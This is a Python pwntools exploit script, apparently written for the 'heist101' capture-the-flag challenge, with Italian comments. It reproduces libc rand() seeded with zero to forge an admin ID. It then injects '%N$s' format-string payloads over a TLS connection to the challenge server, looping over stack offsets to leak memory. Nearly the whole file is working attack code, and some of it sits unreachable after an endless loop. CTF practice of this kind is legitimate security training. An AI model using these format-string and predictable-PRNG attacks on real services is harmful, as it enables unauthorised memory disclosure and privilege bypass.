#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './heist101')
libreriaC = CDLL(exe.libc.path)
host = args.HOST or '.chall.srdnlen.it'
port = int(args.PORT or 443)

def unpack(txt):
    return u64(txt.ljust(8, b'\x00'))

def vers_libc(function):
    return ELF(pwnlib.libcdb.search_by_symbol_offsets(function, select_index=10))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x401302
b *0x4013c1
b *0x401581
b *0x40131a
continue
'''.format(**locals())

# -- Exploit goes here --

def admin():
    var = []
    for i in range(0xf):
        var.append(libreriaC.rand())
    
    a = 0
    c = 0
    for i in range(0xf):
        r2 = a + var[i]
        r10 = r2 // 0xff
        a = r2 - ((r10 << 8) - r10)
        r4 = c + a 
        r19 = r4 // 0xff
        c = r4 - ((r19 << 8) - r19)

    return a | (c << 8)

def sending(txt):
    for i in range(10):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", b"41")
    
    for i in range(len(txt)):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", str(ord(txt[i])).encode())

# io = start()

libreriaC.srand(0)
idAdmin = admin()

idPos = 0x4040aa

i = 0
while True:
    try:
        io = start()
        i += 1
        payload = f"%{i}$s"
        sending(payload)
        io.sendlineafter(b"> ", b"2")
        resp = io.recvline().decode()
        print(i, resp)
        c = input().strip()
        if "n" in c:
            exit()
        io.close()
    except BaseException:
        io.close()
        pass

io.sendlineafter(b"> ", b"2")
resp = io.recvline().decode()
print(resp)
# io.sendlineafter(b"> ", b"41")


io.interactive()

